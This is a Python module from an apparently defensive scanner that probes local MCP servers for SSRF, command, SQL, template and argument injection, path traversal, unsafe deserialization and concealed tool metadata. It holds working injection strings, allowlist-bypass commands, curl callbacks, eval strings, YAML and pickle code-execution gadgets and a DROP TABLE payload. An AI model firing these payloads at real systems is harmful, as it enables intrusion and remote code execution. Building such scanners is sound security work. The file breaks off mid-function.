"""Implementation-bug probes (v2) — the hunt win-rate engine (Family A).

Actively tests a target MCP server's own tools for the server-side flaws that produce real
GHSAs (the class behind ssh-mcp / mcp-shell-server / cli-mcp-server):

    ssrf               a tool fetches an attacker-supplied URL, reaching internal targets
    command_injection  a tool's arg reaches a shell — incl. ALLOWLIST BYPASS via carrier
                       binaries (find -exec, tar --checkpoint) and NETWORK-confirmed exec
                       (curl to our sink, so exec is proven even with a read-only fs)
    path_traversal     a read tool escapes its root, OR a write tool writes outside it

Every probe is AGENT-INDEPENDENT and confirms by GROUND TRUTH, never by guessing from the
schema — SSRF by a hit on a loopback sink we own, injection by a sentinel file only a shell
could create (or a sink hit), traversal by a planted canary coming back or a marker file
appearing outside the root. No live agent, no spend. Safe: only our own loopback sink /
temp files / planted canary are ever touched, and we detect by OUR markers, so a real
file's contents never enter a result.

    python -m hunt.probes --selftest                      # fire on vuln fixture, quiet on safe
    python -m hunt.probes --target-stdio "npx some-mcp"   # probe a real local server

Guardrail: local, open-source servers only (see the mcp-hunt skill). Never point this at a
hosted endpoint you do not own.
"""
from __future__ import annotations

import argparse
import asyncio
import http.server
import json
import os
import re
import shutil
import socketserver
import sys
import tempfile
import threading
import uuid
from dataclasses import dataclass
from pathlib import Path

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

VULNERABLE, CLEAN, NOT_APPLICABLE = "VULNERABLE", "CLEAN", "NOT_APPLICABLE"


@dataclass
class ProbeResult:
    probe: str
    tool: str
    verdict: str
    marker: str = ""
    evidence: str = ""
    rationale: str = ""


# ---- candidate heuristics --------------------------------------------------------------
_URL_PARAM = re.compile(r"url|uri|endpoint|link|webhook|host|address|target|src|href|site|page", re.I)
_CMD_PARAM = re.compile(r"cmd|command|arg|exec|run|shell|script|action|task|process", re.I)
_PATH_PARAM = re.compile(r"path|file|dir|filename|location|doc|document", re.I)
_CONTENT_PARAM = re.compile(r"content|data|text|body|value|source", re.I)
_FETCH_DESC = re.compile(r"fetch|http|request|download|url|web|crawl|scrape|curl", re.I)
# A tool whose STATED PURPOSE is general outbound HTTP: reaching any URL (incl. loopback) is
# by-design, NOT a vuln. SSRF is a finding only when a tool that is NOT a general fetcher can
# be steered to internal hosts. This gate prevents false positives on curl/fetch tools.
_DEDICATED_FETCH = re.compile(
    r"\bcurl\b|http request|https request|fetch (a |the )?url|fetch (the )?contents|"
    r"web request|make .{0,12}request|download (a |the )?file|\bscrape\b|web ?search", re.I)
_CMD_DESC = re.compile(r"\brun\b|execute|shell|command|exec|spawn|subprocess|process", re.I)
_READ_DESC = re.compile(r"read|open|file|path|document|load|\bcat\b|contents", re.I)
_WRITE_DESC = re.compile(r"write|create|save|edit|append|\bput\b|modify", re.I)
_SQL_PARAM = re.compile(r"query|sql|statement|term|filter|search|keyword|\bid\b|title|name|where|column|table", re.I)
_DESER_PARAM = re.compile(r"yaml|yml|pickle|serial|deserial|payload|config|marshal|\bdata\b|\bobj\b|dump", re.I)
_DESER_DESC = re.compile(r"yaml|yml|pickle|deserial|serial|unmarshal|\bload\b|config|parse", re.I)
_SQL_DESC = re.compile(r"\bsql\b|database|\bdb\b|query|select|record|table|sqlite|postgres|mysql|search", re.I)
# SQL-parser error signatures across common engines (error-based SQLi ground truth).
# A tool whose STATED PURPOSE is running arbitrary commands/code/SQL: executing our payload is
# by-design, not a vuln. The real finding is a tool that CLAIMS to restrict (and is bypassed),
# or a non-executor tool that unexpectedly executes.
_EXEC_GENERAL = re.compile(
    r"run (a |an )?[\w ]{0,24}command|execute [\w ]{0,24}command|execute .{0,20}code|"
    r"run .{0,20}script|shell command|run (a )?shell|arbitrary (command|code)", re.I)
_CLAIMS_RESTRICTION = re.compile(
    r"allow ?list|allow-list|white ?list|allowed (command|path|dir)|restrict|\bsecure\b|"
    r"validation|sandbox|\bsafe\b", re.I)
_SQL_EXEC = re.compile(
    r"execute .{0,20}sql|run .{0,20}sql|data modification sql|\bddl\b|arbitrary sql|"
    r"execute (a |an )?query|write query|run (a |an )?query", re.I)
_SQL_ERR = re.compile(
    r"sqlite3?\.|OperationalError|ProgrammingError|IntegrityError|syntax error|unrecognized token|"
    r"unterminated|SQLSTATE|psycopg|MySQL|SQL logic error|near \"|no such column|quoted string",
    re.I)
# A full-text (FTS5) MATCH syntax error on a BOUND parameter is NOT injection — it's a malformed
# search query, expected for any search tool. Exclude it to avoid false positives.
_SQL_FALSE = re.compile(r"fts5|full[- ]?text|\bMATCH\b|fts: ", re.I)


def _schema(tool) -> dict:
    return tool.inputSchema if isinstance(tool.inputSchema, dict) else {}


def _str_params(tool) -> list[str]:
    props = _schema(tool).get("properties", {}) or {}
    return [n for n, s in props.items() if (s or {}).get("type", "string") == "string"]


def _ptype(tool, name: str) -> str:
    return (_schema(tool).get("properties", {}).get(name, {}) or {}).get("type", "string")


def _matching_params(tool, param_re) -> list[str]:
    return [p for p in _str_params(tool) if param_re.search(p)]


def _candidate_params(tool, param_re, desc_re, fallback) -> list[str]:
    """String params worth injecting into for this flaw.

    From the declared schema when it has params; otherwise (a server that under-declares its
    inputSchema — common in the wild) fall back to the category's conventional param names,
    but only when the tool's name/description fits the category, so we don't blind-probe
    everything.
    """
    params = _str_params(tool)
    if params:
        named = [p for p in params if param_re.search(p)]
        if named:
            return named
        return params[:2] if desc_re.search(tool.description or "") else []
    if desc_re.search((tool.description or "") + " " + tool.name):   # empty schema, name/desc fits
        return fallback
    return []


def _build_args(tool, overrides: dict) -> dict:
    """Satisfy required params with type-correct dummies, then apply overrides."""
    props = _schema(tool).get("properties", {}) or {}
    required = set(_schema(tool).get("required", list(props))) | set(overrides)
    args: dict = {}
    for n in required:
        if n in overrides:
            args[n] = overrides[n]
            continue
        t = (props.get(n, {}) or {}).get("type", "string")
        args[n] = {"integer": 1, "number": 1, "boolean": False, "array": [], "object": {}}.get(t, "x")
    return args


def _inject(tool, param: str, payload: str):
    """Wrap the payload for the param's type (array params take a one-element list)."""
    return [payload] if _ptype(tool, param) == "array" else payload


def _result_text(result) -> str:
    return "\n".join(getattr(c, "text", "") or "" for c in (getattr(result, "content", []) or []))


# A tool call that fails for lack of credentials must NOT be scored CLEAN — it was never tested. This
# recognises the common auth/permission failures so the scan can say "requires credentials" honestly.
_AUTH_ERR = re.compile(
    r"\b(401|403)\b|unauthor|forbidden|not authenticated|authentication (failed|required)|"
    r"\b(invalid|missing|expired|no) (api[ _-]?key|token|credential|auth)|permission denied|"
    r"access denied|must (log ?in|authenticate)|\bNOAUTH\b|credentials? (required|not|missing)", re.I)


def is_auth_error(text: str) -> bool:
    """True if a tool result / error looks like an auth or credential failure (not a clean verdict)."""
    return bool(text and _AUTH_ERR.search(text))


class _Sink:
    """Loopback HTTP server recording every request path. Ground truth for SSRF + curl exec."""

    def __init__(self):
        self.hits: list[str] = []
        self._httpd = None
        self.port = None

    def start(self) -> "_Sink":
        hits = self.hits

        class H(http.server.BaseHTTPRequestHandler):
            def _rec(self):
                hits.append(self.path)
                # a redirect path lets us detect servers that follow 3xx (SSRF via redirect)
                if self.path.startswith("/redir-"):
                    self.send_response(302)
                    self.send_header("Location", self.path.replace("/redir-", "/followed-"))
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                self.send_response(200)
                self.send_header("Content-Length", "0")
                self.end_headers()
            do_GET = do_POST = do_PUT = _rec

            def log_message(self, *a):
                pass

        self._httpd = socketserver.TCPServer(("127.0.0.1", 0), H)
        self.port = self._httpd.server_address[1]
        threading.Thread(target=self._httpd.serve_forever, daemon=True).start()
        return self

    def hit(self, marker: str) -> bool:
        return any(marker in h for h in self.hits)

    def stop(self):
        if self._httpd:
            self._httpd.shutdown()
            self._httpd.server_close()


# ---- probes ----------------------------------------------------------------------------
async def probe_ssrf(session, tools) -> list[ProbeResult]:
    out = []
    sink = _Sink().start()
    try:
        for tool in tools:
            params = _candidate_params(tool, _URL_PARAM, _FETCH_DESC, ["url", "uri", "href", "endpoint"])
            if not params:
                continue
            marker = "ssrf-" + uuid.uuid4().hex[:10]
            direct = f"http://127.0.0.1:{sink.port}/{marker}"
            redir = f"http://127.0.0.1:{sink.port}/redir-{marker}"
            for param in params:
                for url in (direct, redir):
                    try:
                        await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, url)}))
                    except Exception:  # noqa: BLE001
                        pass
            await asyncio.sleep(0.3)
            reached = sink.hit(marker)
            if not reached:
                out.append(ProbeResult("ssrf", tool.name, CLEAN, marker=marker,
                                       rationale="did not fetch the loopback URL"))
                continue
            dedicated = bool(_DEDICATED_FETCH.search((tool.description or "") + " " + tool.name))
            follows = sink.hit(f"followed-{marker}")
            if dedicated:   # a general fetch/curl tool reaching a URL is its stated job — not a vuln
                out.append(ProbeResult("ssrf", tool.name, CLEAN, marker=marker,
                                       evidence=f"{tool.name} -> loopback sink",
                                       rationale="dedicated fetch/curl tool reached internal/loopback — "
                                                 "by-design capability (informational: no SSRF egress "
                                                 "filtering), not a finding"))
            else:           # a tool NOT meant as a general fetcher made an outbound request -> SSRF
                out.append(ProbeResult("ssrf", tool.name, VULNERABLE, marker=marker,
                                       evidence=f"{tool.name} -> loopback sink",
                                       rationale="a non-fetch tool was steered to request an "
                                                 "attacker-controlled host, reaching loopback/internal"
                                                 + (" ; follows 3xx redirects" if follows else "")))
    finally:
        sink.stop()
    return out


async def probe_command_injection(session, tools) -> list[ProbeResult]:
    out = []
    d = Path(tempfile.mkdtemp(prefix="probe_cmd_"))
    sink = _Sink().start()
    try:
        for tool in tools:
            params = _candidate_params(tool, _CMD_PARAM, _CMD_DESC, ["command", "cmd", "args", "script"])
            if not params:
                continue
            fired, used = False, ""
            for param in params:
                sentinel = d / ("s_" + uuid.uuid4().hex[:10])
                cmarker = "cmd-" + uuid.uuid4().hex[:10]
                sink_url = f"http://127.0.0.1:{sink.port}/{cmarker}"
                payloads = [
                    f"x; touch {sentinel}", f"x && touch {sentinel}", f"x | touch {sentinel}",
                    f"$(touch {sentinel})", f"`touch {sentinel}`", f"x\ntouch {sentinel}",
                    f"'; touch {sentinel} #", f'"; touch {sentinel} #',
                    # allowlist bypass via carrier binaries whose own flags exec a command:
                    f"find . -maxdepth 0 -exec touch {sentinel} {{}} +",
                    f"find . -maxdepth 0 -exec touch {sentinel} \\;",
                    f"tar cf /dev/null --checkpoint=1 --checkpoint-action=exec=touch {sentinel} .",
                    # network-confirmed exec (works even with a read-only fs):
                    f"x; curl -s {sink_url}", f"$(curl -s {sink_url})", f"`curl -s {sink_url}`",
                    # code/eval injection for code-exec servers (python / node):
                    f"__import__('os').system('touch {sentinel}')",
                    f"eval(\"__import__('os').system('touch {sentinel}')\")",
                    f"require('child_process').execSync('touch {sentinel}')",
                ]
                for p in payloads:
                    try:
                        await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, p)}))
                    except Exception:  # noqa: BLE001
                        pass
                    await asyncio.sleep(0.05)
                    if sentinel.exists() or sink.hit(cmarker):
                        fired, used = True, p
                        break
                if fired:
                    break
            if not fired:
                out.append(ProbeResult("command_injection", tool.name, CLEAN, evidence=used,
                                       rationale="no payload achieved command execution"))
                continue
            desc = (tool.description or "") + " " + tool.name
            if _CLAIMS_RESTRICTION.search(desc):
                verdict, why = VULNERABLE, ("a tool that claims to restrict/validate executed an "
                                            "injected command — restriction bypass")
            elif _EXEC_GENERAL.search(desc):
                verdict, why = CLEAN, ("general command/code-execution tool ran the command — "
                                       "by-design (informational: unrestricted execution), not a finding")
            else:
                verdict, why = VULNERABLE, ("a tool not advertised as a command executor ran an "
                                            "injected command")
            out.append(ProbeResult("command_injection", tool.name, verdict, evidence=used, rationale=why))
    finally:
        sink.stop()
        shutil.rmtree(d, ignore_errors=True)
    return out


def _under(path: str, root: str) -> bool:
    """True iff `path` is `root` or lies within it (proper separator boundary — no prefix trap)."""
    try:
        p, r = os.path.realpath(path), os.path.realpath(root)
    except Exception:  # noqa: BLE001
        return False
    return p == r or p.startswith(r.rstrip(os.sep) + os.sep)


async def _allowed_roots(session, tools) -> list[str]:
    """The server's advertised allowed directories (e.g. filesystem servers' list_allowed_directories),
    so the traversal canary can be planted OUTSIDE them. [] if the server doesn't advertise any."""
    # Match the NAME only — many tools mention "allowed directories" in their DESCRIPTION
    # (read_file etc.), which would mis-select the wrong tool.
    t = next((t for t in tools if re.search(r"allowed.*dir|list[_-]?allowed", t.name, re.I)), None)
    if not t:
        return []
    try:
        text = _result_text(await session.call_tool(t.name, _build_args(t, {})))
    except Exception:  # noqa: BLE001
        return []
    return [p for p in re.findall(r"(/[^\s,:'\"]+)", text) if os.path.isdir(p)]


def _outside_root_dir(roots: list[str]):
    """A fresh temp dir guaranteed to sit OUTSIDE every root; None if the roots cover all candidates."""
    for base in ("/tmp", "/var/tmp", "/dev/shm", str(Path.home()), tempfile.gettempdir()):
        if os.path.isdir(base) and not any(_under(base, r) for r in roots):
            try:
                return Path(tempfile.mkdtemp(prefix="probe_pt_", dir=base))
            except Exception:  # noqa: BLE001
                continue
    return None


async def probe_path_traversal(session, tools) -> list[ProbeResult]:
    out = []
    roots = await _allowed_roots(session, tools)   # plant the canary OUTSIDE the server's real root
    if roots:
        d = _outside_root_dir(roots)
        if d is None:   # root covers every candidate (e.g. '/') — no out-of-root path exists to test
            for tool in tools:
                if _writer_params(tool) or _candidate_params(tool, _PATH_PARAM, _READ_DESC,
                                                             ["path", "file", "filepath", "filename"]):
                    out.append(ProbeResult("path_traversal", tool.name, NOT_APPLICABLE,
                        rationale="server's allowed root spans all candidate locations — no out-of-root "
                                  "path exists to test traversal (not a finding)"))
            return out
    else:
        d = Path(tempfile.mkdtemp(prefix="probe_pt_"))
    marker = "PT-" + uuid.uuid4().hex[:12]
    canary = d / "canary.txt"
    canary.write_text(marker)
    try:
        for tool in tools:
            writer = _writer_params(tool)
            if writer:                                   # arbitrary-write escape
                path_p, content_p = writer
                wmark = "PW-" + uuid.uuid4().hex[:12]
                target = d / f"escaped_{wmark}.txt"       # outside any server root
                try:
                    await session.call_tool(tool.name, _build_args(
                        tool, {path_p: str(target), content_p: wmark}))
                except Exception:  # noqa: BLE001
                    pass
                await asyncio.sleep(0.1)
                wrote = target.exists() and wmark in target.read_text(errors="replace")
                out.append(ProbeResult("path_traversal", tool.name, VULNERABLE if wrote else CLEAN,
                                       marker=wmark, evidence=f"{tool.name}(write outside root)",
                                       rationale=("wrote a file outside its root (arbitrary write)"
                                                  if wrote else "write confined to root")))
                continue
            params = _candidate_params(tool, _PATH_PARAM, _READ_DESC, ["path", "file", "filepath", "filename"])
            if not params:
                continue
            payloads = [str(canary), "../" * 20 + str(canary).lstrip(os.sep),
                        str(canary).replace("/", "\\")]
            fired, used = False, ""
            for param in params:
                for p in payloads:
                    try:
                        r = await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, p)}))
                    except Exception:  # noqa: BLE001
                        r = None
                    if r and marker in _result_text(r):    # only OUR planted marker counts
                        fired, used = True, p
                        break
                if fired:
                    break
            out.append(ProbeResult("path_traversal", tool.name, VULNERABLE if fired else CLEAN, marker=marker,
                                   evidence=used,
                                   rationale=("returned a file outside its root (planted canary leaked)"
                                              if fired else "did not return the out-of-root canary")))
    finally:
        shutil.rmtree(d, ignore_errors=True)
    return out


def _writer_params(tool):
    """Return (path_param, content_param) if the tool looks like it writes a file, else None."""
    looks_write = _WRITE_DESC.search((tool.description or "") + " " + tool.name)
    if not looks_write:
        return None
    params = _str_params(tool)
    if params:
        path_p = next((p for p in params if _PATH_PARAM.search(p)), None)
        content_p = next((p for p in params if _CONTENT_PARAM.search(p)), None)
        return (path_p, content_p) if (path_p and content_p) else None
    if _PATH_PARAM.search(tool.name):                 # empty schema + write-ish name -> guess
        return ("path", "content")
    return None


# ---- tool-metadata concealment (tool poisoning via the approval-view fidelity gap) -----
# Invisible codepoints that reach the model's tokenizer but not a human approval view.
# Ref: "Unicode TAG-Block Concealment of Tool-Metadata Payloads in MCP" (arXiv:2607.05744).
_ZERO_WIDTH = {0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF, 0x00AD}


def _scan_conceal(text: str) -> list[tuple[str, str]]:
    """Return (category, evidence) for each concealment technique found in ``text``."""
    if not text:
        return []
    hits = []
    tag = [c for c in text if 0xE0000 <= ord(c) <= 0xE007F]   # TAG block — smuggled ASCII
    if tag:
        decoded = "".join(chr(ord(c) - 0xE0000) for c in tag if ord(c) - 0xE0000 < 0x80)
        hits.append(("tag-block", f"hidden text: {decoded!r}"))
    if any(ord(c) in _ZERO_WIDTH for c in text):
        hits.append(("zero-width", f"{sum(ord(c) in _ZERO_WIDTH for c in text)} invisible char(s)"))
    if any(0x202A <= ord(c) <= 0x202E or 0x2066 <= ord(c) <= 0x2069 for c in text):
        hits.append(("bidi-override", "direction-override char(s)"))
    if "\x1b" in text:   # ANSI escape sequences (CSI / OSC-8) — hide or rewrite what a human sees
        hits.append(("ansi-escape", f"{text.count(chr(27))} escape sequence(s)"))
    # NOTE: variation selectors (U+FE0F etc.) are intentionally NOT flagged — they are emoji
    # presentation selectors (⚠️ ✅), ubiquitous and benign in tool descriptions. Flagging them
    # produced false positives; TAG-block + zero-width + bidi-override are the real signals.
    return hits


async def probe_tool_poisoning(session, tools) -> list[ProbeResult]:
    """Flag servers that conceal payloads in model-facing metadata (invisible to approval).

    Deterministic, agent-free: inspects each tool's name/description/schema (and resources /
    prompts) for concealment Unicode. A hit means the server hides content the human never
    sees but the model ingests verbatim — the approval-view fidelity gap.
    """
    out = []
    surfaces = [(t.name, t.name, json.dumps(_schema(t), ensure_ascii=False)
                 + " " + (t.description or "")) for t in tools]
    try:    # resources & prompts carry model-facing text too; many servers lack them
        for r in (await session.list_resources()).resources:
            surfaces.append(("resource:" + (r.name or str(r.uri)), str(r.uri),
                             (r.name or "") + " " + (r.description or "")))
    except Exception:  # noqa: BLE001
        pass
    try:
        for p in (await session.list_prompts()).prompts:
            surfaces.append(("prompt:" + p.name, p.name,
                             (p.description or "") + " "
                             + " ".join((a.description or "") for a in (p.arguments or []))))
    except Exception:  # noqa: BLE001
        pass
    for label, name, text in surfaces:
        hits = _scan_conceal(name) + _scan_conceal(text)
        if hits:
            out.append(ProbeResult("tool_poisoning", label, VULNERABLE,
                                   evidence="; ".join(f"{c}: {e}" for c, e in hits),
                                   rationale="concealed payload in model-facing metadata "
                                             "(invisible in the approval view)"))
    return out


async def probe_sql_injection(session, tools) -> list[ProbeResult]:
    """Error-based SQL injection: a quote-bearing arg that surfaces a SQL parser error means
    the input is concatenated into SQL unsanitized. Parameterised servers bind it as data and
    stay quiet, so a SQL-specific error is a low-false-positive signal."""
    out = []
    for tool in tools:
        params = _candidate_params(tool, _SQL_PARAM, _SQL_DESC, ["query", "sql", "term", "filter", "id"])
        if not params:
            continue
        fired, used, ev = False, "", ""
        for param in params:
            for p in ["'", '"', "' OR '1'='1", "')--", "1); DROP TABLE x--"]:
                try:
                    r = await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, p)}))
                    txt = _result_text(r)
                except Exception as exc:  # noqa: BLE001 — some servers surface the SQL error as a tool error
                    txt = str(exc)
                if _SQL_ERR.search(txt) and not _SQL_FALSE.search(txt):   # exclude FTS5/full-text errors
                    fired, used, ev = True, p, txt[:160]
                    break
            if fired:
                break
        if not fired:
            out.append(ProbeResult("sql_injection", tool.name, CLEAN, evidence=used,
                                   rationale="no SQL parser error surfaced"))
            continue
        desc = (tool.description or "") + " " + tool.name
        if _SQL_EXEC.search(desc):
            out.append(ProbeResult("sql_injection", tool.name, CLEAN, evidence=used,
                                   rationale="dedicated SQL-execution tool surfaced a SQL error — "
                                             "by-design (it runs SQL), not injection"))
        else:
            out.append(ProbeResult("sql_injection", tool.name, VULNERABLE, evidence=used,
                                   rationale=f"a non-SQL-execution tool concatenated input into SQL "
                                             f"(error-based): {ev}"))
    return out


_TEMPLATE_PARAM = re.compile(r"template|input|text|message|name|content|value|format|body|subject|"
                             r"title|greeting|prompt", re.I)
_TEMPLATE_DESC = re.compile(r"template|render|format|greet|message|email|report|interpolat|"
                            r"substitut|compose", re.I)
_SSTI_PAYLOADS = ["{{1337*1337}}", "${1337*1337}", "#{1337*1337}", "<%= 1337*1337 %>"]
_SSTI_MARK = "1787569"   # 1337*1337 — distinctive, won't occur naturally; appears only if evaluated

# Argument injection / CLI-flag smuggling: a tool wraps a CLI and passes a param as an argv
# element. A leading-dash value is then interpreted as a FLAG (no shell metacharacters needed —
# defeats allowlists that only block shell chars). Ground truth: inject a benign flag and detect
# its effect in the response (version/usage banner the normal data path would never contain).
_ARG_DESC = re.compile(r"\bgit\b|\btar\b|\bcurl\b|\bwget\b|rsync|ffmpeg|\bzip\b|archive|clone|"
                       r"backup|fetch|download|convert|\bcli\b|command[- ]?line|wrapper|invoke", re.I)
_ARG_PARAM = re.compile(r"arg|ref|option|flag|url|target|source|dest|file|path|name|input|query", re.I)
# Must match a flag TAKING EFFECT (version/usage banner), never the echoed payload itself.
_FLAG_EFFECT = re.compile(r"usage:|\boptions:|GNU \w|libcurl|curl/?\s?\d|git version|wget\s?\d|"
                          r"OpenSSL/|copyright|\blicense\b", re.I)


async def probe_arg_injection(session, tools) -> list[ProbeResult]:
    out = []
    for tool in tools:
        params = _candidate_params(tool, _ARG_PARAM, _ARG_DESC, ["arg", "url", "target", "option", "input"])
        if not params:
            continue
        fired, used, ev = False, "", ""
        for param in params:
            for p in ("--version", "--help", "-V"):
                try:
                    r = await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, p)}))
                    txt = _result_text(r)
                except Exception as exc:  # noqa: BLE001
                    txt = str(exc)
                if _FLAG_EFFECT.search(txt):
                    fired, used, ev = True, p, txt[:120]
                    break
            if fired:
                break
        out.append(ProbeResult("arg_injection", tool.name, VULNERABLE if fired else CLEAN, evidence=used,
                               rationale=(f"leading-dash value interpreted as a CLI flag by the wrapped "
                                          f"binary — argument injection: {ev}" if fired
                                          else "input not interpreted as a CLI flag")))
    return out


async def probe_ssti(session, tools) -> list[ProbeResult]:
    """Server-side template injection: a template expression that the server EVALUATES
    (1337*1337 -> 1787569 in the output) rather than echoing literally. Distinctive marker,
    near-zero false positive."""
    out = []
    for tool in tools:
        params = _candidate_params(tool, _TEMPLATE_PARAM, _TEMPLATE_DESC,
                                   ["input", "template", "text", "message"])
        if not params:
            continue
        fired, used = False, ""
        for param in params:
            for p in _SSTI_PAYLOADS:
                try:
                    r = await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, p)}))
                    txt = _result_text(r)
                except Exception:  # noqa: BLE001
                    txt = ""
                if _SSTI_MARK in txt:
                    fired, used = True, p
                    break
            if fired:
                break
        out.append(ProbeResult("ssti", tool.name, VULNERABLE if fired else CLEAN, evidence=used,
                               rationale=("template expression evaluated server-side "
                                          "(1337*1337 = 1787569 in output)" if fired
                                          else "template expression not evaluated")))
    return out


async def probe_rug_pull(session, tools) -> list[ProbeResult]:
    """Rug pull / dynamic tool redefinition: tool definitions that MUTATE within a session
    (description/schema changed, tools added/removed) after benign interaction — the
    post-approval-mutation indicator. Honest scope: detects in-session mutation, a rug-pull
    signal, not a multi-day post-approval swap."""
    import hashlib

    def h(t):
        body = (t.description or "") + json.dumps(t.inputSchema or {}, ensure_ascii=False, sort_keys=True)
        return hashlib.sha1(body.encode()).hexdigest()

    before = {t.name: h(t) for t in tools}
    for t in tools[:3]:                                    # benign interaction to trigger any mutation
        try:
            await session.call_tool(t.name, _build_args(t, {}))
        except Exception:  # noqa: BLE001
            pass
    try:
        after_tools = (await session.list_tools()).tools
    except Exception:  # noqa: BLE001
        return [ProbeResult("rug_pull", "(server)", CLEAN, rationale="could not re-enumerate tools")]
    after = {t.name: h(t) for t in after_tools}
    changed = [n for n in before if n in after and before[n] != after[n]]
    added = [n for n in after if n not in before]
    removed = [n for n in before if n not in after]
    if changed or added or removed:
        return [ProbeResult("rug_pull", (changed or added or removed)[0], VULNERABLE,
                            evidence=f"changed={changed} added={added} removed={removed}",
                            rationale="tool definitions mutated within a session "
                                      "(dynamic redefinition — rug-pull indicator)")]
    return [ProbeResult("rug_pull", "(server)", CLEAN,
                        rationale="tool definitions stable across the session")]


def _mk_pickle_b64(cmd: str) -> str:
    """A base64 pickle whose unpickling runs `cmd` (the classic pickle RCE gadget). We only
    serialize it here; the code executes if-and-only-if the TARGET unpickles it."""
    import base64
    import pickle

    class _Gadget:
        def __reduce__(self):
            return (os.system, (cmd,))
    return base64.b64encode(pickle.dumps(_Gadget())).decode()


async def probe_deserialization(session, tools) -> list[ProbeResult]:
    """Unsafe deserialization → RCE (CWE-502): a tool runs yaml.load / pickle.loads / similar on
    attacker-supplied input. Ground truth: a sentinel file only deserialization-triggered code could
    create (or a hit on our loopback sink). Unlike command execution, no tool legitimately wants
    deserialization RCE, so a fire is always a finding — no by-design carve-out."""
    out = []
    d = Path(tempfile.mkdtemp(prefix="probe_deser_"))
    sink = _Sink().start()
    try:
        for tool in tools:
            params = _candidate_params(tool, _DESER_PARAM, _DESER_DESC,
                                       ["data", "payload", "yaml", "config", "serialized", "obj"])
            if not params:
                continue
            fired, used = False, ""
            for param in params:
                sentinel = d / ("s_" + uuid.uuid4().hex[:10])
                dmarker = "deser-" + uuid.uuid4().hex[:10]
                sink_url = f"http://127.0.0.1:{sink.port}/{dmarker}"
                payloads = [
                    f'!!python/object/apply:os.system ["touch {sentinel}"]',               # yaml.load RCE
                    f'!!python/object/apply:subprocess.call [["touch", "{sentinel}"]]',
                    f'!!python/object/apply:os.system ["curl -s {sink_url}"]',              # network-confirmed
                    _mk_pickle_b64(f"touch {sentinel}"),                                    # pickle.loads RCE
                ]
                for p in payloads:
                    try:
                        await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, p)}))
                    except Exception:  # noqa: BLE001
                        pass
                    await asyncio.sleep(0.05)
                    if sentinel.exists() or sink.hit(dmarker):
                        fired, used = True, p
                        break
                if fired:
                    break
            if fired:
                out.append(ProbeResult("deserialization", tool.name, VULNERABLE, evidence=used[:120],
                           rationale="tool deserialized attacker input and executed code (unsafe "
                                     "yaml.load / pickle.loads / eval) — ground-truthed by a sentinel "
                                     "only RCE could create (CWE-502)"))
            else:
                out.append(ProbeResult("deserialization", tool.name, CLEAN,
                           rationale="no deserialization payload achieved code execution"))
    finally:
        sink.stop()
        shutil.rmtree(d, ignore_errors=True)
    return out


_CTX_CANARY = ""   # set by scan_target: the planted env secret probe_context_oversharing hunts for


def _res_text(result) -> str:
    """Text of a resource read (contents[].text), for scanning what a resource hands the model."""
    out = []
    for c in (getattr(result, "contents", None) or []):
        t = getattr(c, "text", None)
        if t:
            out.append(t)
    return "\n".join(out)


async def probe_context_oversharing(session, tools) -> list[ProbeResult]:
    """Context oversharing (OWASP MCP10, CWE-200): a tool or resource hands the model data from the
    server's environment it was never scoped to see. Ground truth: scan_target plants a unique secret
    in the server's env; if that exact secret comes back in any model-facing output, the server leaks
    its context. Only our planted UUID counts as the finding (zero-FP) — a server that simply echoes a
    user-supplied value is not oversharing."""
    canary = _CTX_CANARY
    if not canary:
        return [ProbeResult("context_oversharing", "(server)", CLEAN, rationale="no context canary planted")]
    out: list[ProbeResult] = []
    for t in tools:                                   # exercise each tool with benign args
        try:
            text = _result_text(await session.call_tool(t.name, _build_args(t, {})))
        except Exception:  # noqa: BLE001
            continue
        if canary in text:
            out.append(ProbeResult("context_oversharing", t.name, VULNERABLE, marker=canary,
                       rationale="tool returned the server's environment context (a planted secret) to "
                                 "the model — context oversharing (OWASP MCP10 / CWE-200)"))
    try:                                              # and every resource the server exposes
        for res in (await session.list_resources()).resources:
            try:
                text = _res_text(await session.read_resource(res.uri))
            except Exception:  # noqa: BLE001
                continue
            if canary in text:
                out.append(ProbeResult("context_oversharing", "resource:" + str(res.uri), VULNERABLE,
                           marker=canary, rationale="resource exposed the server's environment context "
                                                    "(a planted secret) to the model (OWASP MCP10 / CWE-200)"))
    except Exception:  # noqa: BLE001 — many servers expose no resources endpoint
        pass
    if not out:
        out.append(ProbeResult("context_oversharing", "(server)", CLEAN,
                   rationale="no tool or resource surfaced the planted environment secret"))
    return out


ALL_PROBES = [probe_ssrf, probe_command_injection, probe_path_traversal,
              probe_tool_poisoning, probe_sql_injection, probe_ssti, probe_rug_pull,
              probe_arg_injection, probe_deserialization, probe_context_oversharing]


class ScanError(RuntimeError):
    """A target could not be probed — carries the unwrapped root-cause message (not the opaque
    anyio 'unhandled errors in a TaskGroup' wrapper), so every caller can report/classify honestly."""


def _unwrap(exc: BaseException) -> str:
    """Flatten an exception group to its first informative (non-cancel) leaf: 'Type: message'."""
    subs = getattr(exc, "exceptions", None)
    if subs:                                    # an ExceptionGroup — recurse to a real leaf
        for sub in subs:
            if msg := _unwrap(sub):
                return msg
        return ""
    if isinstance(exc, asyncio.CancelledError):
        return ""                               # cancellation = timeout artifact, not the cause
    return f"{type(exc).__name__}: {exc}".strip().rstrip(":").strip()[:200]


async def scan_target(argv: list[str], env: dict | None = None, probes=None,
                      surface: dict | None = None) -> list[ProbeResult]:
    # Spawn the target in a throwaway cwd so any stray write (by the server or a payload) lands
    # there, never in the repo/working dir. Cleaned up afterwards.
    # If `surface` is passed, it's filled with the server's attack-surface inventory (tools +
    # resources) during the SAME session — no second connect.
    workdir = tempfile.mkdtemp(prefix="mcprt_scan_")
    # Plant a unique secret in the server's environment. If any tool/resource surfaces it to the model,
    # the server overshares its context (MCP10) — ground truth, since a random UUID can't be coincidence.
    # ponytail: module global = one-scan-at-a-time; add a context arg if we ever scan concurrently.
    global _CTX_CANARY
    _CTX_CANARY = "mcprt-ctx-" + uuid.uuid4().hex
    child_env = dict(env or os.environ)
    child_env["MCPRT_CONTEXT_CANARY"] = _CTX_CANARY
